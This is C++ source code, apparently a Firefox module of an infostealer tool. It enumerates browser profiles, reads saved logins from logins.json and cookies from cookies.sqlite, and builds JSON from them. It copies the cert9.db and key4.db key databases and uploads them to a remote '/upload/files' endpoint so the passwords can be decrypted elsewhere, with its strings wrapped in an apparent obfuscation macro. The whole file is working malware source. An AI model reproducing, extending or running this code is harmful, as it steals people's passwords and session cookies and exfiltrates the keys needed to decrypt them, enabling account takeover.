#include "Firefox.h"

Tool::Browsers::Firefox::Firefox(Tool::Configuration::config_t MainContext_t) : Browser(MainContext_t) {
	this->sBrowserIdentifier = STR("Firefox");
	std::string sAppDataPath;
	Tool::Utils::GetRoamingAppDataPath(sAppDataPath);
	this->sBrowserRootPath = std::format("{}\\{}\\{}", sAppDataPath, STR("Mozilla"), STR("Firefox"));
	this->bIsBrowserInstalled = Tool::Utils::IsApplicationInstalled(this->sBrowserRootPath);
	// Enumerate user profile path
	if (!this->bIsBrowserInstalled) {
		Tool::Utils::print(STR("Firefox not installed"));
		return;
	}
	Tool::Utils::print(STR("Firefox installed"));
	this->CreateBrowserProductDir();
	if (this->GetUserProfilePath())
		this->bIsBrowserInstalled = false;
	this->sCookiesBuffer = STR("{\"Cookies\": [");
}

bool Tool::Browsers::Firefox::GetUserProfilePath() {
	for (auto& file : std::filesystem::directory_iterator(this->sBrowserRootPath)) {
		// If profiles directory was found
		if (file.path().string().find(STR("Profiles")) != std::string::npos) {
			for (std::filesystem::recursive_directory_iterator path(file.path().string()), end; path != end; ++path) {
				if (!std::filesystem::is_directory(path->path())) {
					std::string sCurrentFile = path->path().filename().string();
					if (sCurrentFile.find(STR("logins.json")) != std::string::npos) {
						// Add profile path to list of profiles available
						this->vUserProfilesPaths.push_back(path->path().parent_path().string());
					}
				}
			}
		}
	}
	return this->vUserProfilesPaths.empty();
}

void Tool::Browsers::Firefox::GetUserPasswords(awesomejson::json &jLoginPasswords) {
	for (auto const& sProfilePath : std::as_const(this->vUserProfilesPaths)) {
		awesomejson::json jLoginJsonbuff = NULL;
		std::string sCurrentJsonPath = std::format(STR("{}\\logins.json"), sProfilePath);
		if (std::filesystem::exists(sCurrentJsonPath)){
			std::ifstream j(sCurrentJsonPath);
			j >> jLoginJsonbuff;
			jLoginPasswords.merge_patch(jLoginJsonbuff);
		}
	}
}

sqlite3* OpenDatabase(std::string sDbFilePath)
{
	sqlite3* db;
	int rc = sqlite3_open(sDbFilePath.c_str(), &db);
	if (rc) {
		Tool::Utils::print_error(std::format(STR("Error opening sql database {}"), sDbFilePath));
		return NULL;
	}
	return db;
}

void Tool::Browsers::Firefox::GatherCookiesFromDb(int argc, char** argv, char** azColName) {
	try {
		std::string sName = Tool::Utils::UnquoteString(argv[0]);
		std::string sValue = Tool::Utils::UnquoteString(argv[1]);
		std::string sHost = Tool::Utils::UnquoteString(argv[2]);
		std::string sTemp(std::format("\"{}\": \"{}\", \"{}\": \"{}\", \"{}\": \"{}\"",
			azColName[0], sName, azColName[1], sValue, azColName[2], sHost));
		this->sCookiesBuffer += "{" + sTemp + "},";
	}
	catch (...) {}
}

int Tool::Browsers::Firefox::callback(void* data, int argc, char** argv, char** azColName){
	Firefox* firefox = reinterpret_cast<Firefox*>(data);
	firefox->GatherCookiesFromDb(argc, argv, azColName);
	return 0;
}

bool Tool::Browsers::Firefox::ExecuteSqlCommand(sqlite3* db, std::string query)
{
	char* zErrMsg = 0;
	int rc = sqlite3_exec(db, query.c_str(), callback, this, &zErrMsg);
	if (rc != SQLITE_OK) {
		sqlite3_free(zErrMsg);
		return false;
	}
	return true;
}

void Tool::Browsers::Firefox::GetCookiesFromCurrentDB(std::string sCurrentProfilePath) {
	sqlite3* db = Tool::Browsers::ChromiumDecrypt::OpenDatabase(std::format(STR("{}\\cookies.sqlite"), sCurrentProfilePath));
	if (db == NULL) {
		Tool::Utils::print_error(STR("Opening Firefox cookies DB"));
		return;
	}
	std::string query = STR("SELECT name,value,host FROM moz_cookies");
	if (!this->ExecuteSqlCommand(db, &query[0]))
		Tool::Utils::print_error(std::format(STR("Failed executing sql command {}"), query));
	sqlite3_close(db);
}

void Tool::Browsers::Firefox::GetUserCookies(awesomejson::json &jFirefoxCookies) {
	for (auto const& sCurrentProfilePath : std::as_const(this->vUserProfilesPaths))
		this->GetCookiesFromCurrentDB(sCurrentProfilePath);
	if (!this->sCookiesBuffer.ends_with(':')) {
		Tool::Utils::CleanExtraFromJson(this->sCookiesBuffer);
		this->sCookiesBuffer += "]}";
	}
	// Means that no cookies were retrieved
	else
		this->sCookiesBuffer += "[]}";
	jFirefoxCookies = awesomejson::json::parse(this->sCookiesBuffer);
}

bool Tool::Browsers::Firefox::GatherRequiredDbFiles()
{
	// TODO: Support only 1 profile database files for decryption
	std::string sCopiedPath;
	std::string sDbFilePath = std::format(STR("{}\\cert9.db"), this->vUserProfilesPaths[0]);
	this->CopyBrowserFileToProducts(sDbFilePath, sCopiedPath);
	if (sCopiedPath.empty())
		return false;
	Tool::HttpCommunication::HttpRequests::UploadFile(sCopiedPath, STR("/upload/files"), this->MainContext_t.sSessionId, this->MainContext_t.hUserSession);
	sDbFilePath = std::format(STR("{}\\key4.db"), this->vUserProfilesPaths[0]);
	this->CopyBrowserFileToProducts(sDbFilePath, sCopiedPath);
	if (sCopiedPath.empty())
		return false;
	HttpCommunication::HttpRequests::UploadFile(sCopiedPath, STR("/upload/files"), this->MainContext_t.sSessionId, this->MainContext_t.hUserSession);
	return true;
}

void Tool::Browsers::Firefox::ExecuteAllModules(awesomejson::json& jFinalResults, Tool::Browsers::Browser& bBrowser) {
	awesomejson::json jFirefoxPasswords = awesomejson::json({});
	awesomejson::json jFirefoxCookies = awesomejson::json({});
	this->GetUserPasswords(jFirefoxPasswords);
	(jFirefoxPasswords != NULL) ? Tool::Utils::print(STR("Retrieved Firefox passwords")) : Tool::Utils::print_error(STR("Unable to retrieve Firefox passwords"));
	this->GetUserCookies(jFirefoxCookies);
	(jFirefoxCookies != NULL) ? Tool::Utils::print(STR("Retrieved Firefox cookies")) : Tool::Utils::print_error(STR("Unable to retrieve Firefox cookies"));
	std::string firefoxKey(STR("Passwords"));
	jFinalResults[firefoxKey] = jFirefoxPasswords;
	jFinalResults.merge_patch(jFirefoxCookies);
	if (!GatherRequiredDbFiles())
		Tool::Utils::print_error(STR("Unable to copy required Firefox DB files to products"));
}